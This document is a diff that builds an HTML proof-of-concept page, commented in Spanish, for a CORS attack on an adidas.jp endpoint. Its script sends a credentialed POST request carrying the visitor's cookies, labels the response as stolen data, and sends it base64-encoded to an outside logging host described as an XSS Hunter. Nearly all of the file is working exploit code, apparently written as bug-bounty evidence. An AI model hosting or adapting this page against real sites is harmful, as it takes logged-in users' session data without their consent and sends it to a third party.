@@ -1,10 +1,25 @@
-fetch('https://www.adidas.jp/AnES/9kJO/c/Ij_/NYzVeA/Yau3GfcicYuYf1ED5h/CVEhIAE/BzFVYiIv/Fm4B', {
-    method: 'POST',
-    credentials: 'include', // Esto envía las cookies del usuario
-    body: JSON.stringify({sensor_data: "test"})
-})
-.then(response => response.text())
-.then(data => {
-    console.log("¡Datos robados!", data);
-    // Aquí podrías mandar 'data' a tu XSS Hunter
-});
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC Adidas</title>
+</head>
+<body>
+    <h1>Ejecutando PoC de CORS...</h1>
+    <p>Revisa la consola (F12) para ver los datos capturados.</p>
+
+    <script>
+        fetch('https://www.adidas.jp/AnES/9kJO/c/Ij_/NYzVeA/Yau3GfcicYuYf1ED5h/CVEhIAE/BzFVYiIv/Fm4B', {
+            method: 'POST',
+            credentials: 'include', 
+            body: JSON.stringify({sensor_data: "test"})
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log("¡Datos robados!", data);
+            // Esto enviará el resultado a tu log de XSS Hunter para que tengas evidencia
+            fetch('https://test.bugtatsu.xyz/log?data=' + btoa(data));
+        })
+        .catch(err => console.error("Error en la petición:", err));
+    </script>
+</body>
+</html>
